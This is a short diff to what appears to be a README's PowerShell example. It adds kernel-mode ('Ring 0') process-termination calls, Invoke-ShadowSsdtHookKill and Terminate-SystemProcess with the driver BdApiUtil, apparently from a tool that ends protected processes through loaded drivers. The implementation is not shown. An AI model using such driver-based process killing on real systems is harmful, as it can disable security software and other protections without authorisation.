@@ -207,7 +207,8 @@ Start-Sleep -Seconds 1
 tskill /a notepad
 # Ring 0 Kill
 Start-Sleep -Seconds 1
-#Kill-Process -ProcessID $ProcessID -DriverName BdApiUtil
+Invoke-ShadowSsdtHookKill -PROCID $ProcessID
+Terminate-SystemProcess -ProcessID $ProcessID -DriverName BdApiUtil
 Terminate-KernelProcess -ProcID $ProcessID -Driver d591004
 ```
 
